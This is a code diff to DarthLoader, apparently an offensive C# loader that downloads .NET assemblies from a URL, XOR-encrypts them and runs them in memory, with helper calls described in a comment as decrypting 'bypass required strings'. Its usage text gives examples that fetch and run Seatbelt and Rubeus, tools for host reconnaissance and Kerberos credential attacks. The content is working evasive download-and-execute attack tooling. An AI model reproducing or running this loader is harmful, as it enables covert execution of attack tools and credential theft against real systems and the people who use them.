@@ -7,14 +7,7 @@ namespace DarthLoader
 {
     class DarthLoader
     {
-        public static string HelperKey = "";
-
-        static void ExecuteLocalFile(string FilePath)
-        {
-            Assembly dotNetProgram = Assembly.LoadFile(FilePath);
-            Object[] parameters = new String[] { null };
-            dotNetProgram.EntryPoint.Invoke(null, parameters);
-        }
+        public static string FunctionsXorKey = "";
 
         static byte[] FetchRemoteAssembly(string url, string xorKey = "")
         {
@@ -45,21 +38,6 @@ namespace DarthLoader
             return programBytes;
         }
 
-        static void ExecuteRemoteAssembly(byte[] programBytes, string xorKey)
-        {
-            try
-            {
-                Assembly dotNetProgram = Assembly.Load(Helpers.XorBytes(programBytes, xorKey)) ;
-                string[] parameters = new string[] { null };
-                dotNetProgram.EntryPoint.Invoke(null, new object[] { parameters });
-            }
-            catch (TargetInvocationException)
-            {
-                Console.WriteLine("[!] Missing arguments for loaded assembly!");
-                Environment.Exit(-1);
-            }
-        }
-
         static void Main(string[] args)
         {
             string banner =
@@ -75,45 +53,108 @@ namespace DarthLoader
  \$$$$$$$  \$$$$$$$\$$        \$$$$ \$$   \$$\$$$$$$$$\$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$$\$$                                                                                                                                           
                 ";
 
-            Console.WriteLine(banner);
-
-            try
+            if (args.Length == 6)
             {
-                // testing123
-                // decrypts bypass required strings
-                HelperKey = args[0];
-                string filePath = args[1];
+                if (args[0] == "--FunctionsXorKey" && args[2] == "--FilePath" && args[4] == "--Args")
+                {
+                    FunctionsXorKey = args[1];
+                    string filePath = args[3];
+                    string assemblyArgs = args[5];
+                    Helpers.FirstHelperFunction();
+                    Helpers.SecondHelperFunction();
 
-                Helpers.FirstHelperFunction();
-                Helpers.SecondHelperFunction();
+                    if (!filePath.StartsWith("http"))
+                    {
+                        Console.WriteLine(banner);
+                        Console.WriteLine($"[+] Loading assembly from file path: {filePath}");
+                        Console.WriteLine("[+] Assembly loaded into memory... ");
+                        Console.WriteLine("[+] Hit any key to run...");
+                        Console.ReadKey();
+                        Helpers.ExecuteLocalFileArgs(filePath, assemblyArgs);
+                    }
+                }
+                else if (args[0] == "--FunctionsXorKey" && args[2] == "--FilePath" && args[4] == "--XorKey")
+                {
+                    FunctionsXorKey = args[1];
+                    string filePath = args[3];
+                    string xorKey = args[5];
+                    Helpers.FirstHelperFunction();
+                    Helpers.SecondHelperFunction();
 
-                if (filePath.StartsWith("http"))
-                {
-                    string xorKey = args[2];
-                    Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {xorKey}");
-                    byte[] assemblyBytes = FetchRemoteAssembly(filePath, xorKey);
-                    Console.WriteLine("[+] Encrypted assembly loaded into memory... ");
-                    Console.WriteLine("[+] Hit any key to run...");
-                    Console.ReadKey();
-                    ExecuteRemoteAssembly(assemblyBytes, xorKey);
+                    if (filePath.StartsWith("http"))
+                    {
+                        Console.WriteLine(banner);
+                        Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {xorKey}");
+                        byte[] assemblyBytes = FetchRemoteAssembly(filePath, xorKey);
+                        Console.WriteLine("[+] Encrypted assembly loaded into memory... ");
+                        Console.WriteLine("[+] Hit any key to run...");
+                        Console.ReadKey();
+                        Helpers.ExecuteRemoteAssembly(assemblyBytes, xorKey);
+                    }
                 }
-                else if (args.Length < 3)
+            } 
+            else if (args.Length == 4)
+            {
+                if (args[0] == "--FunctionsXorKey" && args[2] == "--FilePath")
                 {
-                    Console.WriteLine($"[+] Loading assembly from file path: {filePath}");
-                    Console.WriteLine("[+] Assembly loaded into memory... ");
-                    Console.WriteLine("[+] Hit any key to run...");
-                    Console.ReadKey();
-                    ExecuteLocalFile(filePath);
-                }
-                else
-                {
-                    Console.WriteLine("[!] Check number of cmdline args.");
+                    FunctionsXorKey = args[1];
+                    string filePath = args[3];
+                    Helpers.FirstHelperFunction();
+                    Helpers.SecondHelperFunction();
+
+                    if (!filePath.StartsWith("http"))
+                    {
+                        Console.WriteLine(banner);
+                        Console.WriteLine($"[+] Loading assembly from file path: {filePath}");
+                        Console.WriteLine("[+] Assembly loaded into memory... ");
+                        Console.WriteLine("[+] Hit any key to run...");
+                        Console.ReadKey();
+                        Helpers.ExecuteLocalFile(filePath);
+                    }
                 }
             }
-            catch (IndexOutOfRangeException)
+            else if (args.Length == 8)
             {
-                Console.WriteLine("==========" + " Usage " + "==========");
-                Console.WriteLine("DarthLoader.exe <UtilityXorKey> <FilePath> <Optional Xor Key for Remote Assembly>\n");
+                if ((args[0] == "--FunctionsXorKey" && args[2] == "--FilePath" && args[4] == "--Args" && args[6] == "--XorKey"))
+                {
+                    FunctionsXorKey = args[1];
+                    string filePath = args[3];
+                    string assemblyArgs = args[5];
+                    string xorKey = args[7];
+                    Helpers.FirstHelperFunction();
+                    Helpers.SecondHelperFunction();
+
+                    if (filePath.StartsWith("http"))
+                    {
+                        Console.WriteLine(banner);
+                        Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {xorKey}");
+                        byte[] assemblyBytes = FetchRemoteAssembly(filePath, xorKey);
+                        Console.WriteLine("[+] Encrypted assembly loaded into memory... ");
+                        Console.WriteLine("[+] Hit any key to run...");
+                        Console.ReadKey();
+                        Helpers.ExecuteRemoteAssemblyArgs(assemblyBytes, xorKey, assemblyArgs);
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine(banner);
+                Console.WriteLine("==================== USAGE: ====================");
+                Console.WriteLine("");
+                Console.WriteLine("--FunctionsXorKey      : Xor key to decrypt function strings from DarthLoaderHelper.exe");
+                Console.WriteLine("--FilePath             : a local file path or URL to load a .Net asseembly from");
+                Console.WriteLine("--Args                 : Xor key to decrypt function strings from DarthLoaderHelper.exe");
+                Console.WriteLine("--XorKey               : Xor key used to encrypt/decrypt .Net assembly from URL");
+                Console.WriteLine("");
+                Console.WriteLine("==================== EXAMPLES: ====================");
+                Console.WriteLine(@"DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Seatbelt.exe --Args AntiVirus --XorKey test");
+                Console.WriteLine("");
+                Console.WriteLine(@"DarthLoader.exe --FunctionsXorKey testing123 --FilePath https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Rubeus.exe --XorKey test");
+                Console.WriteLine("");
+                Console.WriteLine(@"DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\devin\Desktop\Hello.exe");
+                Console.WriteLine("");
+                Console.WriteLine(@"DarthLoader.exe --FunctionsXorKey testing123 --FilePath C:\Users\devin\Desktop\Hello.exe --Args test");
+                Console.WriteLine("");
             }
         }
     }
